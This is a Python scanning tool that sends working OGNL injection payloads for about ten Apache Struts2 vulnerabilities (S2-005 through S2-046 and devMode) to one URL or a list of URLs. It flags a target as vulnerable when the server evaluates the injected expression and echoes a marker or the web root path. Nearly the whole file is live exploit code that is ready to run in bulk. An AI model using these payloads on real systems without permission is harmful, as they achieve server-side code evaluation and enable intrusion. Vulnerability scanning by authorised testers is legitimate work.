# -*- coding: utf-8 -*-
#env: python 2.7
#code by iwath
#edit by shuicho

import requests
import optparse
import queue   # py3 queue代替了Queue
import sys

class Struts_vul():
    def __init__(self,options):
        self.options = options
        self.headers = {'user_agent' : "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36","Content-Type":"application/x-www-form-urlencoded"}
        self.urls = []
        self.logo()
        if self.options.url:
            self.urls.append(self.options.url)
        if self.options.file:
            # f = file(self.options.file)
            f = open(self.options.file)
            for line in f.readlines():
                url = line.strip()
                self.urls.append(url)
        self.queue = queue.Queue()  #py3格式
        for url in self.urls:
            self._scan(url)
#        self._print_result()
            
    def _print_result(self):
        while 1:
            if self.queue.qsize() > 0:
                msg = self.queue.get()
                print(msg)
            else:
                break
        
    def logo(self):
        print('\n')
        print('[+]*****************************************************[+]')
        print('[+] scan s2-005/009/016/019/032/033/037/045/046/devMode [+]')
        print('[+]       any advice mailto:lwhat@sina.cn               [+]')
        print('[+]            reference: github.com                    [+]')
        print('[+]*****************************************************[+]')
        print('\n')
        

    def s2_005(self,url):
        payload = r"?('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43req\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('\43xman\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('\43xman\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('\43xman.getWriter().println(\43req.getRealPath(%22lwhat\u005c%22))')(d))&(i99)(('\43xman.getWriter().close()')(d))"
        url1 = url + payload
        try:
            s = requests.get(url1,headers = self.headers)
            if 'lwhat' in  s.text:
                print(url,u' 存在s2-005')
                self.queue.put(url + u' 存在s2-005')
                return
            payload = r"?('%20_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('%20context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('%20c')(('%20_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('%20req\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('%20xman\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('%20xman\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('%20xman.getWriter().println(%20req.getRealPath(%22lwhat\u005c%22))')(d))&(i99)(('%20xman.getWriter().close()')(d))"
            url2 = url + payload
            s = requests.get(url2,headers = self.headers)
            if 'lwhat' in  s.text:
                print(url,u' 存在s2-005')
                self.queue.put(url + u' 存在s2-005')
                return
        except Exception as e:
            print(e)
        # except Exception,e:
        #print url,u'不存在s2-005'
            return

    def s2_009(self,url):
        payload = r"class.classLoader.jarPath=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=%20new%20java.lang.Boolean(false), %23_memberAccess[%22allowStaticMethodAccess%22]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23outstr.print(%22lwhat%22),%23outstr.println(%23req.getRealPath(%22/%22)),%23outstr.close())(meh)&z[(class.classLoader.jarPath)('meh')]"
        try:
            s = requests.post(url,payload,headers = self.headers)
            if 'lwhat' in s.text:
                print(url,u' 存在s2-009')
                self.queue.put(url + u' 存在s2-009')
                return
            payload1 = r"class.classLoader.jarPath=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=%20new%20java.lang.Boolean(false),%23_memberAccess[%22allowStaticMethodAccess%22]=true,%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23outstr=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23outstr.print(%22lwhat%22),%23outstr.println(%23req.getRealPath(%22/%22)),%23outstr.close())(meh)&z[(class.classLoader.jarPath)('meh')]"
            s = requests.post(url,payload,headers = self.headers)
            if 'lwhat' in s.text:
                print(url,u' 存在s2-009')
                self.queue.put(url + u' 存在s2-009')
                return
        # except Exception,e:
        except Exception as e:
            print(e)
        #print url,u'不存在s2-009'
            return
    
    def s2_016(self,url):
        payload = r"?redirect:$%7B%23a%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23b%3d%23a.getRealPath(%22/lwhat%22),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23b),%23matt.getWriter().flush(),%23matt.getWriter().close()%7D"
        url1 = url + payload
        try:
            s = requests.get(url1,headers = self.headers)
            if 'lwhat' in s.text:
                print(url,u" 存在s2-016")
                self.queue.put(url + u' 存在s2-016')
                return
        # except Exception,e:
        except Exception as e:
            print(e)
        #print url,u"不存在s2-016"
            return
    
    def s2_019(self,url):
        flag = False
        payload = r"?debug=command&expression=%23req%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27),%23resp%3d%23context.get(%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27),%23resp.setCharacterEncoding(%27UTF-8%27),%23resp.getWriter().print(%22web%22),%23resp.getWriter().print(%22lwhat8888887:%22),%23resp.getWriter().print(%23req.getSession().getServletContext().getRealPath(%22/%22)),%23resp.getWriter().flush(),%23resp.getWriter().close()"
        url1 = url + payload
        try:
            s = requests.get(url1,headers = self.headers)
            if 'lwhat' in s.text:
                flag = True
                print(url,u" 存在s2-019")
                self.queue.put(url + u' 存在s2-019')
                return
        # except Exception,e:
        except Exception as e:
            print(e)
        #print url,u"不存在s2-019"
            return
    def s2_032(self,url):
        payload = "?method:%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%2C%23test%3D%23context.get%28%23parameters.res%5B0%5D%29.getWriter%28%29%2C%23test.println%28%23parameters.command%5B0%5D%29%2C%23test.flush%28%29%2C%23test.close&res=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=lwhat"
        url1 = url + payload
        try:
            s = requests.get(url1,headers = self.headers)
            if 'lwhat' in s.text:
                print(url,u" 存在s2-032")
                self.queue.put(url + u' 存在s2-032')
                return
        # except Exception,e:
        except Exception as e:
            print(e)
        #print url,u"不存在s2-032"
            return      
    
    def s2_033(self,url):
        payload = "/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23parameters.content[0]),%23wr.close(),xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=lwhat";
        url1 = url + payload
        try:
            s = requests.get(url1,headers = self.headers)
            if 'lwhat' in s.text:
                print(url,u" 存在s2-033")
                self.queue.put(url + u' 存在s2-033')
                return
        # except Exception,e:
        except Exception as e:
            print(e)
        #print url,u"不存在s2-033"
            return
    
    def s2_037(self,url):
        payload = "/%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23wr.println(%23parameters.content[0]),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=lwhat"
        url1 = url + payload
        try:
            s = requests.get(url1,headers = self.headers)
            if 'lwhat' in s.text:
                print(url,u" 存在s2-037")
                self.queue.put(url + u' 存在s2-037')
                return
        # except Exception,e:
        except Exception as e:
            print(e)
        #print url,u"不存在s2-037"
            return
    
    
    
    
    def s2_045(self,url):
        headers = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36","Content-Type":"%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('lwhat','lwhat')}.multipart/form-data}"}
        try:
            s = requests.post(url,headers = headers)
            if 'lwhat' in s.headers:
                print(url,u" 存在s2-045")
                self.queue.put(url + u' 存在s2-045')
                return
        # except Exception,e:
        except Exception as e:
            print(e)
        #print url,u"不存在s2-045"
            return
    
    def s2_046(self,url):
        headers = {"Content-Type":"multipart/form-data; boundary=----WebKitFormBoundaryXd004BVJN9pBYBL2"}
        postdata = ''
        postdata += "------WebKitFormBoundaryXd004BVJN9pBYBL2\r\n"
        postdata += "Content-Disposition: form-data; name=\"upload\"; filename=\"%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('lwhat','lwhat')}\0a\"\r\n"
        postdata += "Content-Type: text/plain\r\n"
        postdata += "\r\n"
        postdata += "foo\r\n"
        postdata += "------WebKitFormBoundaryXd004BVJN9pBYBL2--\r\n"
        try:
            s = requests.post(url,postdata,headers = headers)
            if 'lwhat' in s.headers:
                print(url,u" 存在s2-046")
                self.queue.put(url + u' 存在s2-046')
                return
        # except Exception,e:
        except Exception as e:
            print(e)
        #print url,u"不存在s2-046"
            return
    
    def devMode_struts(self,url):
        payload = "?debug=browser&object=(%23mem=%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f%23context[%23parameters.rpsobj[0]].getWriter().println(%23parameters.content[0]):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=lwhat"
        url1 = url + payload
        try:
            s = requests.get(url1,headers = self.headers)
            if 'lwhat' in s.text:
                print(url,u' 存在devMode struts2漏洞')
                self.queue.put(url + u' 存在devMode struts2漏洞')
                return
        # except Exception,e:
        except Exception as e:
            print(e)
        #print url,u'不存在devMode struts2漏洞'
            return
        
    def _scan(self,url):
        self.s2_005(url)
        self.s2_009(url)
        self.s2_016(url)
        self.s2_019(url)
        self.s2_032(url)
        self.s2_033(url)
        self.s2_037(url)
        self.s2_045(url)
        self.s2_046(url)
        self.devMode_struts(url)
        return
    
        
if __name__ == '__main__':
    parser = optparse.OptionParser("usage: %prog [options]", version = "%prog v1.0-5.13")
    parser.add_option('-u', '--url', dest = 'url', help = "input the url to scan")
    parser.add_option('-f','--file', dest = 'file', help = 'input the file contains the urls')
    
    (options, args) = parser.parse_args()
    if len(sys.argv[:]) < 3:
        parser.print_help()
        exit(0)
    d = Struts_vul(options)
